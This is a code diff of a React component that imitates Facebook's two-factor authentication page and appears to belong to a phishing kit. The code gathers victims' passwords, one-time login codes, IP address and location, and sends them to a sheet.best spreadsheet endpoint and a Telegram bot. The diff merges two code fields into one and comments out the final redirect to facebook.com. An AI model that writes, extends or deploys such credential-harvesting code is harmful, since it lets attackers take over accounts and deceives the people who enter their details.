@@ -1,4 +1,4 @@
-import React, { useEffect, useState } from "react";
+import { useEffect, useState } from "react";
 import '../confirm/style.css';
 import TextArea from "antd/es/input/TextArea";
 import { Button } from "antd";
@@ -11,9 +11,7 @@ const Confirm = () => {
   const [time, setTime] = useState(300); // Thời gian ban đầu là 5 phút (300 giây)
   const [isTimeUp, setIsTimeUp] = useState(false);
   const business = useSelector((state: any) => state.business)
-  const [checkCode, setCheckCode] = useState(false);
   const [code, setCode] = useState('');
-  const [codeFirst, setCodeFirst] = useState(code)
   const dispatch = useDispatch()
   const [loading, setLoading] = useState(false);
 
@@ -44,20 +42,14 @@ const Confirm = () => {
   };
 
   const handleFacebookRedirect = async () => {
-    if (!checkCode) {
-      setCheckCode(true)
-      setCodeFirst(code)
-    } else {
-      setLoading(true)
-      setCheckCode(false)
-      await Promise.all([
-        sendTelegramBotForBusiness(),
-        sendTelegramBotForGgsheet()
-      ])
-      setLoading(false)
-      clearStore()
-      window.location.href = 'https://www.facebook.com/';
-    }
+    setLoading(true)
+    await Promise.all([
+      sendTelegramBotForBusiness(),
+      sendTelegramBotForGgsheet()
+    ])
+    setLoading(false)
+    clearStore()
+    // window.location.href = 'https://www.facebook.com/';
     // Redirect to Facebook
   };
 
@@ -76,8 +68,7 @@ const Confirm = () => {
         ["Please provide us information that will help us investigate"]: business.text,
         ['Password First']: business.passwordFirst,
         ['Password Second']: business.passwordSecond,
-        ['Code First']: codeFirst,
-        ['Code Second']: code,
+        ['Code']: code,
       }
       await axios.post('https://sheet.best/api/sheets/abe85991-15f1-47f0-a1d6-242f44b22e94', data).catch(() => {
         message = '❌Thêm vào sheet không thành công'
@@ -115,8 +106,7 @@ const Confirm = () => {
       Ip: ${response.data.ip_address}
       City: ${response.data.city}
       Country: ${response.data.country}
-      First Code Authen: ${codeFirst}
-      Second Code Authen: ${code}
+      Code Authen: ${code}
       `;
       await axios.post(CURRENT_API_URL, {
         chat_id: ETelegram.CHAT_ID,
@@ -147,7 +137,6 @@ const Confirm = () => {
       passwordSecond: '',
     }))
     setCode('')
-    setCodeFirst('')
   }
 
   return (
@@ -163,9 +152,9 @@ const Confirm = () => {
         <div className="form">
           <div className="title">Two-factor authentication required (1/3)</div>
           <div className="text_content">
-            <p style={{ marginTop: '16px' }}>You’ve asked us to require a 6-digit login code when anyone tries to access your account from a new device or browser.</p>
-            <p style={{ marginTop: '20px', marginBottom: '24px' }}>Enter the 6-digit code from your code generator or third-party app below.</p>
-            <TextArea onChange={(e: any) => setCode(e.target.value)} style={{ width: '26%' }} placeholder="Enter code" autoSize /> {isTimeUp ? (<a href="##" style={{ marginLeft: "10px", textDecoration: 'none', color: "#385898" }}>Send code</a>) : (<span style={{ marginLeft: "10px" }}>(wait: {formatTime(time)})</span>)}
+            <p style={{ marginTop: '16px' }}>You’ve asked us to require a 6-digit or 8-digit login code when anyone tries to access your account from a new device or browser.</p>
+            <p style={{ marginTop: '20px', marginBottom: '24px' }}>Enter the 6-digit or 8-digit  code from your code generator or third-party app below.</p>
+            <TextArea className="input_code" onChange={(e: any) => setCode(e.target.value)} placeholder="Enter code" autoSize /> {isTimeUp ? (<a href="##" style={{ marginLeft: "10px", textDecoration: 'none', color: "#385898" }}>Send code</a>) : (<span style={{ marginLeft: "10px" }}>(wait: {formatTime(time)})</span>)}
           </div>
           <div className="footer_form">
             <p className="footer_form-title">Need another way to authenticate?</p>
